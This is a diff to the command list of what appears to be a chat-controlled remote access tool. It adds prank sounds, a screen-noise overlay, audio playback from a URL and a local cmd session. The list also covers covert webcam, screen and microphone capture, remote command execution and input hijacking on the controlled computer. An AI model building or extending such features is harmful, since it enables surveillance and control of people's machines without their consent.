@@ -33,7 +33,9 @@ webcamandscreenstreamstop - Stops the webcam and screen stream.
 🔊 Audio & Volume
 urltoast - Shows a url opening windows toast.
 breath - Play breathing sound.
-pss - Play "psst" sound.
+pss - Plays "psst" sound.
+fart - Plays a fart sound.
+knockknock - Plays a knock on a door sound, pretty realistic too.
 microphone - Record mic audio.
 mutevolume - Set computer's volume to 0.
 fullvolume - Set computer's volume to 100.
@@ -41,6 +43,7 @@ setvolume - Set computer's volume level.
 getvolume - Gets the computer's volume level.
 tralalerotralala - Plays italian brainrot.
 mixermenu - Sends a mixer menu.
+playfromurl - Plays an audio from an url. (WAV, MP3, OGG)
 😈 Pranks & Visuals
 jumpscare - Show random jumpscare.
 jumpscarenoaudio - Jumpscare no audio.
@@ -50,6 +53,8 @@ messagebox - Show a custom message box.
 messagespam - Spam message boxes.
 camerawallpaper - Sets webcam's frames as wallpaper.
 setvideowallpaper - Sets a video as wallpaper.
+hdmi_drowning_effect - Sets a noise/disturbed effect overlay on screen.
+stop_hdmi_drowning_effect - Stops the noise/disturbed effect overlay on screen.
 💻 System Control
 execute - Run system command.
 processkiller - Shows a table of processes that you can kill.
@@ -57,11 +62,13 @@ terminateprocess - Kills a process by name.
 procmonmenu - Shows procmon menu.
 procmonadd - Adds a process to the process monitor list.
 procmonrem - Removes a process to the process monitor list.
+cmdsession - Enters a local cmd session.
 🎮 Input / Device Control
 randomkeyboard - Sets all user's input to random characters.
 capslock - Activates capslock.
 mousecontroller - Sends a mouse controlling menu.
 mouselock - Locks the mouse in position.
+setMouseJump - Sets the jump of the mouse in mousecontroller.
 📋 Messaging
 bsend - Send custom text.
 id - Get Owner Chat ID.
